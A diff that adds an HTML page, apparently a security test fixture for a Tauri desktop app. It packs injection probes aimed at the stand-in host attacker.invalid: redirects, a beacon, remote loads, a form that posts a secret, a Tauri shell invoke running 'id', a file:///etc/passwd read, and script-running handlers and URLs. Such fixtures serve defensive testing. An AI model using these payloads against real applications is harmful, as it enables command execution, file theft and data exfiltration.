@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+  <head>
+    <base href="https://attacker.invalid/">
+    <meta http-equiv="refresh" content="0;url=https://attacker.invalid/redirect">
+    <link rel="stylesheet" href="https://attacker.invalid/remote.css">
+  </head>
+  <body onload="window.__TAURI__.core.invoke('shell', {command: 'id'})">
+    <script>
+      fetch('https://attacker.invalid/beacon');
+      window.location = 'https://attacker.invalid/navigate';
+    </script>
+    <iframe src="https://attacker.invalid/frame"></iframe>
+    <object data="file:///etc/passwd"></object>
+    <form action="https://attacker.invalid/post"><input name="secret"><button>Send</button></form>
+    <a href="javascript:alert(document.domain)">JavaScript URL</a>
+    <img src="https://attacker.invalid/pixel" onerror="alert(1)">
+    <svg><a href="https://attacker.invalid/svg-link"><text>SVG link</text></a></svg>
+  </body>
+</html>
